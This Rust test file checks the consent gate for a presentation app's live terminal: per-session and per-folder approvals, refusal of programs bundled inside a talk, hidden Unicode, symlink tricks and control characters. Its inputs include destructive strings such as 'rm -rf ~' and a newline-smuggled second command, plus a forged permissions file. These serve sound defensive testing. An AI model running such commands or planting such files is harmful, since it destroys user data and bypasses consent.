//! The yes a talk needs before it runs a program: asked once a session, remembered only for one
//! folder and one command, never kept in a talk, shown in full, and impossible to go round.

#[path = "support/helper.rs"]
mod helper;
#[path = "support/typing.rs"]
mod typing;

use std::ffi::OsString;
use std::path::{Path, PathBuf};
use std::sync::{Mutex, MutexGuard};

use typing::*;

use gpui_kit::component::WindowExt as _;
use gpui_kit::test::TestWindowExt as _;
use gpui_kit::{AnyWindowHandle, AppContext as _, TestAppContext};
use slides_engine::Fonts;
use stagepack_studio::document::{Document, TalkPlace, UntitledId};
use stagepack_studio::export::{ExportKind, run_export};
use stagepack_studio::live_terminal::{
    Decision, HELPER_ENV, RUN_ALWAYS_ID, RUN_ASK_ID, RUN_HEAD_ID, RUN_HEAD_LINE_ID, RUN_IN_NEW_FOLDER, RUN_LINE_ID, RUN_NO_ID, RUN_NOT_ASCII, RUN_PROGRAM_BY_PATH, RUN_PROGRAM_IN_TALK,
    RUN_LONG, RUN_QUESTION, RUN_WARNING, RUN_WORDS_BAR_ID, RUN_WORDS_ID, RUN_WORDS_SCROLLBAR, RUN_YES_ID,
    RunAnswer, RunPermissions, RunQuestion, SessionYes, TalkFolder, ask_to_run, may_run, may_run_with_path, may_type, permit, plan, plan_with_path, start_after_yes,
    untypable,
};
use stagepack_studio::present_view::start_show;

fn words(command: &[&str]) -> Vec<String> {
    command.iter().map(|word| word.to_string()).collect()
}

fn permissions_in(dir: &Path) -> RunPermissions {
    RunPermissions::load(dir.join("terminal-permissions.json"))
}

fn sys_path() -> OsString {
    std::env::var_os("PATH").unwrap()
}

/// The absolute folder of the PATH that holds `sh`.
fn sys_dir() -> PathBuf {
    std::env::split_paths(&sys_path()).find(|entry| entry.is_absolute() && entry.join("sh").is_file()).expect("a folder with sh")
}

fn path_of(entries: &[&Path]) -> OsString {
    std::env::join_paths(entries).unwrap()
}

/// Writes a program called `name` in `dir`.
#[cfg(unix)]
fn program(dir: &Path, name: &str) -> PathBuf {
    use std::os::unix::fs::PermissionsExt as _;
    std::fs::create_dir_all(dir).unwrap();
    let file = dir.join(name);
    std::fs::write(&file, "#!/bin/sh\nexit 0\n").unwrap();
    std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o755)).unwrap();
    file
}

fn key_of(talk: &TalkPlace, command: &[&str]) -> stagepack_studio::live_terminal::RunKey {
    plan(talk, &words(command)).unwrap().key().clone()
}

#[test]
fn the_yes_is_asked_once_per_session() {
    let folder = tempfile::tempdir().unwrap();
    let talk = TalkPlace::Folder(folder.path().to_path_buf());
    let scratch = tempfile::tempdir().unwrap();
    let remembered = permissions_in(scratch.path());
    let sh = words(&["sh"]);
    let key = key_of(&talk, &["sh"]);
    let mut session = SessionYes::new();
    assert_eq!(may_run(&talk, &sh, &session, &remembered), Decision::Ask);
    session.allow_for_tests(&key);
    assert_eq!(may_run(&talk, &sh, &session, &remembered), Decision::Run);
    assert_eq!(may_run(&talk, &words(&["sh", "-l"]), &session, &remembered), Decision::Ask, "another command asks again");
    assert_eq!(may_run(&talk, &words(&["ls"]), &session, &remembered), Decision::Ask);
    session.refuse_for_tests(&key);
    assert!(session.refused(&key) && !session.allowed(&key));
    assert_eq!(may_run(&talk, &sh, &session, &remembered), Decision::Refused);
    assert_eq!(may_run(&talk, &sh, &SessionYes::new(), &remembered), Decision::Ask, "a new session starts over");
    for place in [TalkPlace::Packed(folder.path().join("a.sptx")), TalkPlace::Untitled(UntitledId(7))] {
        assert_eq!(may_run(&place, &sh, &SessionYes::new(), &remembered), Decision::Ask);
    }
}

#[test]
fn a_yes_is_for_where_it_runs_too() {
    let root = tempfile::tempdir().unwrap();
    let (a, b) = (root.path().join("a"), root.path().join("b"));
    std::fs::create_dir_all(&a).unwrap();
    std::fs::create_dir_all(&b).unwrap();
    let scratch = tempfile::tempdir().unwrap();
    let remembered = permissions_in(scratch.path());
    let (in_a, in_b, packed) = (TalkPlace::Folder(a), TalkPlace::Folder(b), TalkPlace::Packed(root.path().join("t.sptx")));
    let mut session = SessionYes::new();
    session.allow_for_tests(&key_of(&packed, &["sh"]));
    // A pack that is saved as a folder, or a talk moved to another folder, is asked about again.
    assert_eq!(may_run(&packed, &words(&["sh"]), &session, &remembered), Decision::Run);
    assert_eq!(may_run(&in_a, &words(&["sh"]), &session, &remembered), Decision::Ask);
    session.allow_for_tests(&key_of(&in_a, &["sh"]));
    assert_eq!(may_run(&in_a, &words(&["sh"]), &session, &remembered), Decision::Run);
    assert_eq!(may_run(&in_b, &words(&["sh"]), &session, &remembered), Decision::Ask);
}

#[test]
fn a_command_that_cant_run_is_refused_whatever_has_been_said() {
    let folder = tempfile::tempdir().unwrap();
    let talk = TalkPlace::Folder(folder.path().to_path_buf());
    let scratch = tempfile::tempdir().unwrap();
    let remembered = permissions_in(scratch.path());
    let too_many: Vec<String> = (0..65).map(|n| format!("w{n}")).collect();
    let too_long = vec!["x".repeat(4097)];
    for bad in [Vec::new(), vec![String::new()], too_many, too_long, words(&["nosuchprogramanywhere"])] {
        assert_eq!(may_run(&talk, &bad, &SessionYes::new(), &remembered), Decision::Refused, "{:?}", bad.len());
    }
}

#[test]
fn what_hides_in_a_word_is_refused() {
    let folder = tempfile::tempdir().unwrap();
    let talk = TalkPlace::Folder(folder.path().to_path_buf());
    let scratch = tempfile::tempdir().unwrap();
    let remembered = permissions_in(scratch.path());
    let hiding = [
        "a\u{202E}b", "a\u{200B}b", "a\nb", "a\tb", "a\u{2028}b", "a\u{FEFF}b", "a\u{2066}b", "a\u{AD}b", "a\u{85}b", "a\u{A0}b", "a\rb",
        "a   b", "a  b", " lead", "trail ",
        // Blank or invisible without being Cc, Cf or white space.
        "a\u{2800}b", "a\u{3164}b", "a\u{115F}b", "a\u{1160}b", "a\u{FFA0}b", "a\u{34F}b", "a\u{FE00}b", "a\u{FE0F}b", "a\u{E0100}b",
        "a\u{E01EF}b", "a\u{180B}b", "a\u{180D}b", "a\u{180F}b", "a\u{17B4}b", "a\u{17B5}b", "a\u{890}b", "a\u{891}b", "a\u{110CD}b",
        "a\u{13430}b", "a\u{1343F}b", "a\u{1BCA0}b", "a\u{1BCA3}b", "a\u{E0001}b", "a\u{E0020}b", "a\u{E007F}b", "a\u{E000}b",
        "a\u{3000}b", "a\u{A0}b", "a\u{2003}b", "a\u{1680}b", "a\u{202F}b", "a\u{205F}b", "a\u{2029}b", "a\u{FFF9}b",
        // More than two combining marks in a row.
        "a\u{301}\u{302}\u{303}b",
    ];
    for word in hiding {
        let command = words(&["echo", word]);
        // Even a yes already given isn't one for it.
        let mut session = SessionYes::new();
        if let Ok(plan) = plan(&talk, &command) {
            session.allow_for_tests(plan.key());
        }
        assert_eq!(may_run(&talk, &command, &session, &remembered), Decision::Refused, "{word:?}");
    }
    // An empty argument, one single space, plain words, Norwegian and two combining marks are what a command is.
    for fine in [vec!["echo", ""], vec!["echo", "two words"], vec!["echo", "-n", "x y z"], vec!["echo", "blåbærsyltetøy ÆØÅ"], vec!["echo", "e\u{301}\u{302}"]] {
        assert_eq!(may_run(&talk, &words(&fine), &SessionYes::new(), &remembered), Decision::Ask, "{fine:?}");
    }
}

#[cfg(unix)]
#[test]
fn the_program_is_the_file_that_runs_and_never_the_talks_by_a_name() {
    let root = tempfile::tempdir().unwrap();
    let folder = root.path().join("talk");
    program(&folder, "sh");
    program(&folder.join("bin"), "sh");
    program(&folder, "tool");
    let canonical = folder.canonicalize().unwrap();
    let talk = TalkPlace::Folder(folder.clone());
    let real = sys_dir();
    // PATH has `.`, a relative folder, an empty entry and the talk's own folder given absolutely, ahead of the system's.
    let path = OsString::from(format!(".:bin::{}:{}:{}", canonical.display(), canonical.join("bin").display(), real.display()));
    let one = plan_with_path(&talk, &words(&["sh"]), Some(&path));
    // The talk's own folder given absolutely ahead of the system's is refused, not run.
    let why = one.expect_err("a program that is the talk's");
    assert!(why.contains("comes with this talk"), "{why}");
    let path = OsString::from(format!(".:bin::{}", real.display()));
    let two = plan_with_path(&talk, &words(&["sh"]), Some(&path)).unwrap();
    assert!(!two.program_in_talk());
    assert_eq!(two.shown_words()[0], real.join("sh").display().to_string(), "the system's, as an absolute path");
    // A path is the talk's own file, said so.
    let three = plan_with_path(&talk, &words(&["./tool", "x"]), Some(&path)).unwrap();
    assert!(three.program_in_talk());
    assert_eq!(three.shown_words(), words(&["<talk>/tool", "x"]));
    // A bare name that is only in the talk isn't found.
    let missing = plan_with_path(&talk, &words(&["tool"]), Some(&path)).unwrap_err();
    assert!(missing.contains("no program called \"tool\""), "{missing}");
    // A pack has nowhere for a relative path to be.
    let packed = TalkPlace::Packed(root.path().join("t.sptx"));
    assert!(plan_with_path(&packed, &words(&["./tool"]), Some(&path)).is_err());
}

#[cfg(unix)]
#[test]
fn always_is_for_the_resolved_program() {
    let root = tempfile::tempdir().unwrap();
    let folder = root.path().join("talk");
    std::fs::create_dir_all(&folder).unwrap();
    let (one, other) = (root.path().join("one"), root.path().join("other"));
    program(&one, "demo");
    program(&other, "demo");
    let talk = TalkPlace::Folder(folder);
    let scratch = tempfile::tempdir().unwrap();
    let mut remembered = permissions_in(scratch.path());
    let by_one = path_of(&[&one]);
    let by_other = path_of(&[&other]);
    let kept = plan_with_path(&talk, &words(&["demo"]), Some(&by_one)).unwrap();
    remembered.remember(kept.folder().unwrap(), kept.key().command()).unwrap();
    let session = SessionYes::new();
    assert_eq!(may_run_with_path(&talk, &words(&["demo"]), Some(&by_one), &session, &remembered), Decision::Run);
    assert_eq!(may_run_with_path(&talk, &words(&["demo"]), Some(&by_other), &session, &remembered), Decision::Ask, "it resolves elsewhere now");
}

#[test]
fn always_is_for_one_folder_and_one_command() {
    let root = tempfile::tempdir().unwrap();
    let (a, b) = (root.path().join("a"), root.path().join("b"));
    std::fs::create_dir_all(&a).unwrap();
    std::fs::create_dir_all(&b).unwrap();
    let scratch = tempfile::tempdir().unwrap();
    let mut remembered = permissions_in(scratch.path());
    let sh = words(&["sh"]);
    let kept = plan(&TalkPlace::Folder(a.clone()), &sh).unwrap();
    remembered.remember(kept.folder().unwrap(), kept.key().command()).unwrap();
    let session = SessionYes::new();
    let decide = |place: &TalkPlace, command: &[String]| may_run(place, command, &session, &remembered);
    assert_eq!(decide(&TalkPlace::Folder(a.clone()), &sh), Decision::Run);
    assert_eq!(decide(&TalkPlace::Folder(a.clone()), &words(&["sh", "-l"])), Decision::Ask);
    assert_eq!(decide(&TalkPlace::Folder(b.clone()), &sh), Decision::Ask);
    assert_eq!(decide(&TalkPlace::Folder(a.join("..").join("a")), &sh), Decision::Run);
    #[cfg(unix)]
    {
        let link = root.path().join("link");
        std::os::unix::fs::symlink(&a, &link).unwrap();
        assert_eq!(decide(&TalkPlace::Folder(link), &sh), Decision::Run);
    }
    assert_eq!(decide(&TalkPlace::Packed(a.join("copy.sptx")), &sh), Decision::Ask);
    assert_eq!(decide(&TalkPlace::Packed(a.clone()), &sh), Decision::Ask);
    assert_eq!(decide(&TalkPlace::Untitled(UntitledId(1)), &sh), Decision::Ask);
    let again = permissions_in(scratch.path());
    assert!(again.always(&a, kept.key().command()) && !again.always(&b, kept.key().command()));
    let renamed = root.path().join("renamed");
    std::fs::rename(&a, &renamed).unwrap();
    assert_eq!(may_run(&TalkPlace::Folder(renamed), &sh, &session, &again), Decision::Ask);
    // A folder that is gone can't be run in at all.
    assert_eq!(may_run(&TalkPlace::Folder(a), &sh, &session, &again), Decision::Refused);
}

#[test]
fn a_file_that_cant_be_read_is_no_permissions() {
    let scratch = tempfile::tempdir().unwrap();
    let file = scratch.path().join("terminal-permissions.json");
    let folder = tempfile::tempdir().unwrap();
    for contents in ["", "not json", "{\"always_run\": 5}", "{\"always_run\": [{\"folder\": 1}]}"] {
        std::fs::write(&file, contents).unwrap();
        assert!(!RunPermissions::load(file.clone()).always(folder.path(), &words(&["bash"])), "{contents}");
    }
    assert!(!RunPermissions::load(scratch.path().join("missing.json")).always(folder.path(), &words(&["bash"])));
}

#[test]
fn a_talk_cant_give_itself_a_yes() {
    let talk = tempfile::tempdir().unwrap();
    let scratch = tempfile::tempdir().unwrap();
    let sh = words(&["sh"]);
    let canonical = talk.path().canonicalize().unwrap();
    let real = plan(&TalkPlace::Folder(talk.path().to_path_buf()), &sh).unwrap().key().command().to_vec();
    let claim = format!("{{\"always_run\": [{{\"folder\": {:?}, \"command\": {:?}}}]}}", canonical.display().to_string(), real);
    std::fs::write(talk.path().join("terminal-permissions.json"), &claim).unwrap();
    std::fs::create_dir_all(talk.path().join("stagepack-studio")).unwrap();
    std::fs::write(talk.path().join("stagepack-studio/terminal-permissions.json"), &claim).unwrap();
    std::fs::write(talk.path().join("slides.md"), "# T\n").unwrap();
    let own = permissions_in(scratch.path());
    let place = TalkPlace::Folder(talk.path().to_path_buf());
    assert_eq!(may_run(&place, &sh, &SessionYes::new(), &own), Decision::Ask);
    let document = Document::open(talk.path(), Fonts::bundled_only()).unwrap();
    assert_eq!(may_run(document.place(), &sh, &SessionYes::new(), &own), Decision::Ask);
    let mut own = own;
    let kept = plan(&place, &sh).unwrap();
    own.remember(kept.folder().unwrap(), kept.key().command()).unwrap();
    assert!(scratch.path().join("terminal-permissions.json").is_file());
    assert_eq!(std::fs::read_to_string(talk.path().join("terminal-permissions.json")).unwrap(), claim);
}

#[test]
fn where_it_runs_and_with_what_comes_from_the_talk() {
    let folder = tempfile::tempdir().unwrap();
    let canonical = folder.path().canonicalize().unwrap();
    let remembered = permissions_in(folder.path().parent().unwrap());
    let command = words(&["sh", "-c", "true"]);
    let mut session = SessionYes::new();
    let place = TalkPlace::Folder(folder.path().to_path_buf());
    assert!(matches!(permit(&place, &command, &session, &remembered, (40, 6)), Err(Decision::Ask)));
    session.allow_for_tests(plan(&place, &command).unwrap().key());
    let granted = permit(&place, &command, &session, &remembered, (40, 6)).unwrap();
    let spec = granted.spec();
    assert_eq!(spec.cwd, canonical);
    assert!(Path::new(&spec.program).is_absolute() && spec.program.ends_with("/sh"), "{}", spec.program);
    assert_eq!(spec.args, words(&["-c", "true"]));
    let names: Vec<&str> = spec.env.iter().map(|(name, _)| name.as_str()).collect();
    assert_eq!(names, ["TERM", "COLUMNS", "LINES"]);
    // A pack runs in a new empty folder, removed when it's let go of.
    let packed = TalkPlace::Packed(folder.path().join("t.sptx"));
    session.allow_for_tests(plan(&packed, &command).unwrap().key());
    let granted = permit(&packed, &command, &session, &remembered, (40, 6)).unwrap();
    let scratch = granted.spec().cwd.clone();
    assert!(scratch.is_dir() && std::fs::read_dir(&scratch).unwrap().next().is_none());
    assert_ne!(scratch, canonical);
    drop(granted);
    // Dropping the permit alone doesn't start anything, but it did make the folder: it goes with it.
    assert!(!scratch.exists());
    // A folder that has gone can't be run in.
    let gone = TalkPlace::Folder(folder.path().join("gone"));
    assert!(matches!(permit(&gone, &command, &session, &remembered, (40, 6)), Err(Decision::Refused)));
}

#[cfg(unix)]
#[test]
fn a_path_folder_inside_the_talk_or_linking_into_it_is_refused() {
    let root = tempfile::tempdir().unwrap();
    let folder = root.path().join("talk");
    program(&folder.join("bin"), "demo");
    let canonical = folder.canonicalize().unwrap();
    let talk = TalkPlace::Folder(folder.clone());
    let real = sys_dir();
    // The talk's own folder, as written and by a link.
    let link = root.path().join("elsewhere");
    std::os::unix::fs::symlink(canonical.join("bin"), &link).unwrap();
    for entry in [canonical.join("bin"), link] {
        let path = path_of(&[&entry, &real]);
        let why = plan_with_path(&talk, &words(&["sh"]), Some(&path)).unwrap_err();
        assert!(why.contains("comes with this talk"), "{why}");
    }
    // A link inside the talk's folder that leads out of it: the folder is the talk's.
    std::fs::create_dir_all(canonical.join("tools")).unwrap();
    std::os::unix::fs::symlink(real.join("sh"), canonical.join("tools/sh")).unwrap();
    let path = path_of(&[&canonical.join("tools"), &real]);
    assert!(plan_with_path(&talk, &words(&["sh"]), Some(&path)).is_err());
}

#[cfg(unix)]
#[test]
fn a_path_that_isnt_text_is_refused() {
    use std::os::unix::ffi::OsStrExt as _;
    let root = tempfile::tempdir().unwrap();
    let odd = root.path().join(std::ffi::OsStr::from_bytes(b"odd\xFFfolder"));
    let name = program(&odd, "demo");
    let talk = TalkPlace::Folder(root.path().to_path_buf());
    let path = path_of(&[&odd]);
    assert!(plan_with_path(&talk, &words(&["demo"]), Some(&path)).is_err(), "found by the PATH");
    assert!(plan_with_path(&talk, &[name.to_string_lossy().into_owned()], None).is_err(), "named by a path");
    // And a talk whose own folder isn't text can't run anything.
    let in_odd = TalkPlace::Folder(odd);
    assert!(plan_with_path(&in_odd, &words(&["sh"]), Some(&sys_path())).is_err());
}

#[cfg(unix)]
#[test]
fn a_program_written_as_a_path_is_the_talks_choice_wherever_it_is() {
    let folder = tempfile::tempdir().unwrap();
    let talk = TalkPlace::Folder(folder.path().to_path_buf());
    let absolute = sys_dir().join("sh").display().to_string();
    let one = plan_with_path(&talk, &words(&[&absolute]), Some(&sys_path())).unwrap();
    assert!(one.program_named_by_path() && !one.program_in_talk(), "the dialog says the talk names it by its path");
    // A path is taken as the file it really is.
    assert_eq!(one.shown_words()[0], Path::new(&absolute).canonicalize().unwrap().display().to_string());
    let by_name = plan_with_path(&talk, &words(&["sh"]), Some(&sys_path())).unwrap();
    assert!(!by_name.program_in_talk() && !by_name.program_named_by_path());
    // `..` and `.` are settled in the words.
    let up = plan_with_path(&talk, &words(&["./../x"]), Some(&sys_path()));
    assert!(up.is_err());
}

/// The stand-in for a network folder: a folder of this test's own that counts as one on this
/// thread only, so that what a link or a `..` reaches can be tested here.
#[cfg(unix)]
struct Forbidden;

#[cfg(unix)]
impl Forbidden {
    fn of(folders: Vec<PathBuf>) -> Self {
        stagepack_studio::live_terminal::forbid_for_tests(folders);
        Forbidden
    }
}

#[cfg(unix)]
impl Drop for Forbidden {
    fn drop(&mut self) {
        stagepack_studio::live_terminal::forbid_for_tests(Vec::new());
    }
}

#[cfg(unix)]
#[test]
fn a_link_or_dots_never_lead_to_a_network_folder() {
    use std::os::unix::fs::symlink;
    let root = tempfile::tempdir().unwrap();
    let root = root.path().canonicalize().unwrap();
    let network = root.join("network");
    program(&network, "demo");
    let folder = root.join("talk");
    std::fs::create_dir_all(folder.join("c")).unwrap();
    let talk = TalkPlace::Folder(folder.clone());
    // A chain of links inside the talk: a -> b -> c/../d -> the network folder.
    symlink("b", folder.join("a")).unwrap();
    symlink("c/../d", folder.join("b")).unwrap();
    symlink(&network, folder.join("d")).unwrap();
    let by_links = "./a/demo";
    let by_dots = format!("{}/talk/../nowhere/../network/demo", root.display());
    // Without the stand-in both reach the program, so it's the check that stops them.
    for word in [by_links, &by_dots] {
        let found = plan_with_path(&talk, &words(&[word]), None).unwrap();
        assert_eq!(found.shown_words()[0], network.join("demo").display().to_string(), "{word}");
    }
    let _forbidden = Forbidden::of(vec![network.clone()]);
    for word in [by_links, &by_dots] {
        let why = plan_with_path(&talk, &words(&[word]), None).unwrap_err();
        assert!(why.contains("network folder"), "{word}: {why}");
    }
    // A PATH folder that links there is passed over, and one that is there too.
    std::fs::create_dir_all(folder.join("..").join("tools")).unwrap();
    let tools = root.join("tools");
    symlink(&network, tools.join("net")).unwrap();
    for entry in [tools.join("net"), network.clone()] {
        let path = path_of(&[&entry]);
        let why = plan_with_path(&talk, &words(&["demo"]), Some(&path)).unwrap_err();
        assert!(why.contains("There's no program"), "{why}");
    }
}

#[cfg(unix)]
#[test]
fn a_link_that_goes_on_and_on_is_refused() {
    use std::os::unix::fs::symlink;
    let folder = tempfile::tempdir().unwrap();
    let folder = folder.path().canonicalize().unwrap();
    let talk = TalkPlace::Folder(folder.clone());
    // A loop.
    symlink("loop-b", folder.join("loop-a")).unwrap();
    symlink("loop-a", folder.join("loop-b")).unwrap();
    assert!(plan_with_path(&talk, &words(&["./loop-a"]), None).unwrap_err().contains("There's no program"));
    // A chain of 40 links is followed; 41 is too many.
    program(&folder.join("bin"), "demo");
    let chain = |name: &str, length: usize| {
        let mut next = "bin/demo".to_string();
        for n in 0..length {
            let link = format!("{name}-{n}");
            symlink(&next, folder.join(&link)).unwrap();
            next = link;
        }
        format!("./{next}")
    };
    let forty = chain("forty", 40);
    assert!(plan_with_path(&talk, &words(&[&forty]), None).is_ok());
    let more = chain("more", 41);
    assert!(plan_with_path(&talk, &words(&[&more]), None).is_err());
}

#[cfg(unix)]
#[test]
fn a_link_into_the_talk_is_the_talks_however_it_gets_there() {
    use std::os::unix::fs::symlink;
    let root = tempfile::tempdir().unwrap();
    let root = root.path().canonicalize().unwrap();
    let folder = root.join("talk");
    program(&folder.join("bin"), "demo");
    let talk = TalkPlace::Folder(folder.clone());
    // From outside, by a link whose target goes up and back in.
    std::fs::create_dir_all(root.join("outside")).unwrap();
    symlink("../talk/./bin/../bin", root.join("outside/in")).unwrap();
    let word = format!("{}/outside/in/demo", root.display());
    let found = plan_with_path(&talk, &words(&[&word]), None).unwrap();
    assert!(found.program_in_talk(), "it's the talk's own program");
    let path = path_of(&[&root.join("outside/in")]);
    let why = plan_with_path(&talk, &words(&["demo"]), Some(&path)).unwrap_err();
    assert!(why.contains("comes with this talk"), "{why}");
}

// Windows: the rules are written for it and have not been compiled or run here (no Windows
// toolchain); they are for the owner's by-hand check.
#[cfg(windows)]
#[test]
fn on_windows_only_an_exe_or_com_is_a_program() {
    let root = tempfile::tempdir().unwrap();
    let folder = root.path().join("talk");
    std::fs::create_dir_all(&folder).unwrap();
    let bin = root.path().join("bin");
    std::fs::create_dir_all(&bin).unwrap();
    for name in ["tool.cmd", "tool.bat", "TOOL2.BAT", "script.ps1", "real.exe", "OLD.COM"] {
        std::fs::write(bin.join(name), "").unwrap();
    }
    let talk = TalkPlace::Folder(folder);
    let path = path_of(&[&bin]);
    for refused in ["tool.cmd", "tool.bat", "TOOL2.BAT", "tool.bat.", "script.ps1", "tool"] {
        assert!(plan_with_path(&talk, &words(&[refused]), Some(&path)).is_err(), "{refused}");
    }
    for fine in ["real.exe", "REAL.EXE", "real", "OLD.COM"] {
        assert!(plan_with_path(&talk, &words(&[fine]), Some(&path)).is_ok(), "{fine}");
    }
    for drive_relative in ["C:foo", "C:", "D:x\\y.exe"] {
        assert!(plan_with_path(&talk, &words(&[drive_relative]), Some(&path)).is_err(), "{drive_relative}");
    }
}

#[cfg(windows)]
#[test]
fn on_windows_a_relative_program_is_found_in_the_talk() {
    let root = tempfile::tempdir().unwrap();
    let folder = root.path().join("talk");
    std::fs::create_dir_all(&folder).unwrap();
    std::fs::write(folder.join("tool.exe"), "").unwrap();
    let talk = TalkPlace::Folder(folder);
    let found = plan_with_path(&talk, &words(&["./tool.exe"]), None).unwrap();
    assert!(found.program_in_talk());
    assert_eq!(found.shown_words()[0], "<talk>/tool.exe");
}

// Typed text: what a button types into a live terminal has a yes of its own.

#[test]
fn typed_text_is_asked_once_per_text() {
    let folder = tempfile::tempdir().unwrap();
    let talk = TalkPlace::Folder(folder.path().to_path_buf());
    let scratch = tempfile::tempdir().unwrap();
    let remembered = permissions_in(scratch.path());
    let sh = words(&["sh"]);
    let mut session = SessionYes::new();
    assert_eq!(may_type(&talk, "ls -la", &sh, &session, &remembered), Decision::Ask, "the first press asks");
    session.allow_typed_for_tests(&talk, "ls -la", &sh);
    assert_eq!(may_type(&talk, "ls -la", &sh, &session, &remembered), Decision::Run, "a second press doesn't");
    for other in ["ls -lb", "ls -la ", "ls -l", "LS -la", "ls\t-la"] {
        assert_eq!(may_type(&talk, other, &sh, &session, &remembered), Decision::Ask, "{other:?} is matched exactly");
    }
    session.refuse_typed_for_tests(&talk, "ls -lb", &sh);
    assert_eq!(may_type(&talk, "ls -lb", &sh, &session, &remembered), Decision::Refused, "a no isn't asked again");
    assert_eq!(may_type(&talk, "ls -la", &sh, &session, &remembered), Decision::Run);
    // A yes is for the talk's folder too.
    let elsewhere = tempfile::tempdir().unwrap();
    let other_talk = TalkPlace::Folder(elsewhere.path().to_path_buf());
    assert_eq!(may_type(&other_talk, "ls -la", &sh, &session, &remembered), Decision::Ask);
    let packed = TalkPlace::Packed(folder.path().join("talk.stagepack"));
    assert_eq!(may_type(&packed, "ls -la", &sh, &session, &remembered), Decision::Ask);
}

#[test]
fn a_yes_for_the_shell_does_not_cover_typed_text() {
    let folder = tempfile::tempdir().unwrap();
    let talk = TalkPlace::Folder(folder.path().to_path_buf());
    let scratch = tempfile::tempdir().unwrap();
    let mut remembered = permissions_in(scratch.path());
    let sh = words(&["sh"]);
    let mut session = SessionYes::new();
    let kept = plan(&talk, &sh).unwrap();
    session.allow_for_tests(kept.key());
    remembered.remember(kept.folder().unwrap(), kept.key().command()).unwrap();
    assert_eq!(may_run(&talk, &sh, &session, &remembered), Decision::Run);
    let resolved = kept.key().command().join(" ");
    for text in ["sh", resolved.as_str(), "rm -rf ~", ""] {
        assert_eq!(may_type(&talk, text, &sh, &session, &remembered), Decision::Ask, "{text:?}");
        assert_eq!(may_type(&talk, text, kept.key().command(), &session, &remembered), Decision::Ask, "{text:?}");
    }
    // Nor the other way round.
    let mut typed_only = SessionYes::new();
    typed_only.allow_typed_for_tests(&talk, "ls", &words(&["ls"]));
    assert_eq!(may_run(&talk, &words(&["ls"]), &typed_only, &permissions_in(tempfile::tempdir().unwrap().path())), Decision::Ask);
}

#[gpui_kit::test]
fn always_remembers_typed_text_for_a_folder_talk_only(cx: &mut TestAppContext) {
    let folder = tempfile::tempdir().unwrap();
    let talk = TalkPlace::Folder(folder.path().to_path_buf());
    let scratch = tempfile::tempdir().unwrap();
    let file = scratch.path().join("terminal-permissions.json");
    let sh = words(&["sh"]);
    let session = SessionYes::new();

    // A file written before typed text was remembered has no `typed`: it reads as none, and keeps
    // what it had when a text is remembered.
    let canonical = folder.path().canonicalize().unwrap();
    let old = serde_json::json!({ "always_run": [{ "folder": canonical, "command": ["/bin/sh"] }] });
    std::fs::write(&file, serde_json::to_vec(&old).unwrap()).unwrap();
    let mut remembered = permissions_in(scratch.path());
    assert!(remembered.always(folder.path(), &words(&["/bin/sh"])));
    assert_eq!(may_type(&talk, "make demo", &sh, &session, &remembered), Decision::Ask);

    remembered.remember_typed(&TalkFolder::of(&talk).unwrap(), "make demo", &sh).unwrap();
    let again = permissions_in(scratch.path());
    assert_eq!(may_type(&talk, "make demo", &sh, &session, &again), Decision::Run, "kept for the folder");
    assert!(again.always(folder.path(), &words(&["/bin/sh"])), "what was there is kept");
    assert_eq!(may_type(&talk, "make demo2", &sh, &session, &again), Decision::Ask);
    assert_eq!(may_type(&talk, "make demo", &words(&["bash"]), &session, &again), Decision::Ask);
    let written: serde_json::Value = serde_json::from_slice(&std::fs::read(&file).unwrap()).unwrap();
    assert_eq!(written["typed"].as_array().map(Vec::len), Some(1), "under its own key: {written}");
    assert_eq!(written["always_run"].as_array().map(Vec::len), Some(1));
    // Remembering a command keeps the typed text.
    let mut more = permissions_in(scratch.path());
    let cat = plan(&talk, &words(&["cat"])).unwrap();
    more.remember(cat.folder().unwrap(), cat.key().command()).unwrap();
    assert_eq!(may_type(&talk, "make demo", &sh, &session, &permissions_in(scratch.path())), Decision::Run);
    // A key the reader doesn't know is passed over, as an older app passes over `typed`.
    let mut newer = written.clone();
    newer["from_a_newer_app"] = serde_json::json!([1, 2, 3]);
    std::fs::write(&file, serde_json::to_vec(&newer).unwrap()).unwrap();
    assert_eq!(may_type(&talk, "make demo", &sh, &session, &permissions_in(scratch.path())), Decision::Run);

    // A packed talk is never remembered for, wherever it's kept, and its question has no Always.
    let packed = TalkPlace::Packed(folder.path().join("talk.stagepack"));
    assert!(TalkFolder::of(&packed).is_none());
    assert_eq!(may_type(&packed, "make demo", &sh, &session, &permissions_in(scratch.path())), Decision::Ask);
    let (typing, _scratch) = window(cx);
    for (folder, always) in [(Some(canonical.clone()), true), (None, false)] {
        let question = RunQuestion {
            command: sh.clone(),
            program_in_talk: false,
            program_by_path: false,
            folder,
            typed: Some("make demo".to_string()),
        };
        let answered = std::rc::Rc::new(std::cell::Cell::new(None));
        let heard = answered.clone();
        let asked = cx.update_window(typing.handle, |_, window, cx| ask_to_run(window, cx, question, move |answer, _, _| heard.set(Some(answer)))).unwrap();
        typing.settle(cx);
        assert!(asked);
        assert!(showing(&typing, cx, RUN_YES_ID));
        assert_eq!(showing(&typing, cx, RUN_ALWAYS_ID), always);
        click_on(&typing, cx, RUN_YES_ID);
        assert_eq!(answered.get(), Some(RunAnswer::Run));
    }
}

#[test]
fn typed_text_with_control_characters_or_over_4096_bytes_is_refused() {
    let folder = tempfile::tempdir().unwrap();
    let talk = TalkPlace::Folder(folder.path().to_path_buf());
    let scratch = tempfile::tempdir().unwrap();
    let remembered = permissions_in(scratch.path());
    let sh = words(&["sh"]);
    let control = "This button's text has a control character.";
    let long = "This button's text is over 4,096 bytes.";
    let refused = [
        ("echo hi\r".to_string(), control),
        ("echo hi\nrm -rf ~".to_string(), control),
        ("\u{1b}[31mred".to_string(), control),
        ("bell\u{7}".to_string(), control),
        ("del\u{7f}".to_string(), control),
        ("c1\u{9b}".to_string(), control),
        ("a".repeat(4097), long),
        // Bytes, not characters.
        ("é".repeat(2049), long),
    ];
    for (text, why) in &refused {
        assert_eq!(untypable(text), Some(*why), "{text:?}");
        let mut session = SessionYes::new();
        session.allow_typed_for_tests(&talk, text, &sh);
        assert_eq!(may_type(&talk, text, &sh, &session, &remembered), Decision::Refused, "never typed, whatever was said: {text:?}");
    }
    // What hides, as a command's words can't.
    for text in ["ls\u{200B}", "ls\u{202E}", "a\u{00A0}b", "a\u{2028}b", "x\u{301}\u{301}\u{301}"] {
        assert!(untypable(text).is_some(), "{text:?}");
        assert_eq!(may_type(&talk, text, &sh, &SessionYes::new(), &remembered), Decision::Refused, "{text:?}");
    }
